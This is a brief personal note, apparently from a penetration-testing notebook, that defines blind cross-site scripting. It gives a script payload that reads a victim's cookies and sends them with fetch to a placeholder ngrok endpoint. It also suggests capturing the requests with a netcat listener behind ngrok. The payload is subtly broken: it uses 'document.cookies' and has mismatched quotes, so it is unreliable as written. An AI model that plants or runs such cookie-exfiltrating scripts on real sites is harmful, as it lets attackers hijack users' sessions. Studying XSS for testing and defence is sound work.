## Blind XSS 
Blind xss is when we are able to execute javascript in another persons browser via data that we control, but may not be able to see. Similar to Stored.

Payload to receive information back. 
```
<script> 
var cookies = document.cookies

fetch('http://'<URL/NGROK ENDPOINT/?'+ cookies)
</script>
```


You can use ngrok to forward a nc listener to capture these requests.
[[ngrok]]